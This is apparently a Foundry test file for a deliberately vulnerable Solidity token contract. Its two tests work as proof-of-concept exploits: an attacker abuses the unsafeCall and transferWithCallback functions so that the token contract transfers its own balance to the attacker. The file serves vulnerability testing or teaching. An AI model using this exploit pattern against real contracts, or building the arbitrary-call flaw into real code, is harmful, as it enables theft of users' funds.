// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/A16.sol";

contract MaliciousReceiver {
    event Log(address sender, uint256 value, bytes data);

    function tokenFallback(address, uint256, bytes calldata) external {
        // This could be empty or contain malicious logic
    }

    fallback() external payable {
        emit Log(msg.sender, msg.value, msg.data);
    }
}

contract A16Test is Test {
    UnsafeCallToken token;
    address admin = address(0x1);
    address attacker = address(0x2);
    MaliciousReceiver malicious;

    function setUp() public {
        token = new UnsafeCallToken();
        malicious = new MaliciousReceiver();
        
        vm.prank(admin);
        token.transfer(address(malicious), 1000); // Seed malicious contract with tokens
    }

    function testUnsafeCallStealTokens() public {
        // 1. Attacker prepares malicious call to transfer tokens out
        bytes memory data = abi.encodeWithSignature(
            "transfer(address,uint256)",
            attacker,
            1000
        );

        // 2. Attacker uses unsafeCall to execute transfer from token contract's balance
        vm.prank(attacker);
        token.unsafeCall(address(token), data);

        // 3. Attacker now has the tokens
        assertEq(token.balanceOf(attacker), 1000);
    }

    function testTransferWithCallbackAbuse() public {
        // 1. Attacker prepares malicious callback data
        bytes memory maliciousData = abi.encodeWithSignature(
            "transfer(address,uint256)",
            attacker,
            1000
        );

        // 2. Attacker triggers transferWithCallback to execute malicious operation
        vm.prank(attacker);
        token.transferWithCallback(address(token), 0, maliciousData);

        // 3. The callback executes a transfer from the token contract's balance
        assertEq(token.balanceOf(attacker), 1000);
    }
}